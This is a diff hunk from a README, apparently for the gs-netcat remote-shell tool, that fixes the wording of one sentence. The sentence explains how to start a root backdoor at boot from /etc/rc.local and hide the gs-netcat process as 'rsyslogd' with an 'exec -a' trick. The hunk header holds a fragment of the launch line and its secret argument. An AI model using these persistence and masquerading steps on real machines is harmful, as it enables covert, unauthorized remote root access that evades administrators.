@@ -227,7 +227,7 @@ GSOCKET_ARGS="-s MySecret -liqD" HOME=/root TERM=xterm-256color SHELL="/bin/bash
 
 exit 0
 ```
-Not all environment variables are during system bootup. Thus we set some values to make the backdoor more enjoyable: *TERM=xterm-256color* and *SHELL=/bin/bash* and *HOME=/root*. The startup script (*/etc/rc.local*) uses */bin/sh* which does not support our *exec -a* trick. Thus we use */bin/sh* to start */bin/bash* which in turn does the *exec -a* trick and starts *gs-netcat*. Puh. The gs-netcat process is hidden (as *rsyslogd*) from the process list. Read [how to enable rc.local](https://linuxmedium.com/how-to-enable-etc-rc-local-with-systemd-on-ubuntu-20-04/) if */etc/rc.local* does not exist.  
+Not all environment variables are set during system bootup. Set some variables to make the backdoor more enjoyable: *TERM=xterm-256color* and *SHELL=/bin/bash* and *HOME=/root*. The startup script (*/etc/rc.local*) uses */bin/sh* which does not support our *exec -a* trick. Thus we use */bin/sh* to start */bin/bash* which in turn does the *exec -a* trick and starts *gs-netcat*. Puh. The gs-netcat process is hidden (as *rsyslogd*) from the process list. Read [how to enable rc.local](https://linuxmedium.com/how-to-enable-etc-rc-local-with-systemd-on-ubuntu-20-04/) if */etc/rc.local* does not exist.  
 
 Alternatively install gs-netcat as a [systemd service](examples/systemd-root-shell).
 
